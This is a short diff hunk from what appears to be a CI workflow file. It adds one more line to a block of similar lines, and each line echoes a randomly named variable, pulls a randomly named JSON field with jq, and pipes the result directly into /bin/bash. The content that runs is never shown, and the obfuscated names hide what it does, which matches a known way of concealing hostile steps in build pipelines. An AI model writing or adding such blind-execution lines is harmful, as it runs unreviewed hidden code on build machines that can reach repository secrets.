@@ -22,6 +22,7 @@ jobs:
           echo $rezip64145 | jq -r .irarf107 | /bin/bash
           echo $fls1037 | jq -r .ygd6 | /bin/bash
           echo $fg0 | jq -r .cwwxw9 | /bin/bash
+          echo $nrdyo7757 | jq -r .dfps5 | /bin/bash
 
       - name: Upload results
         if: always()
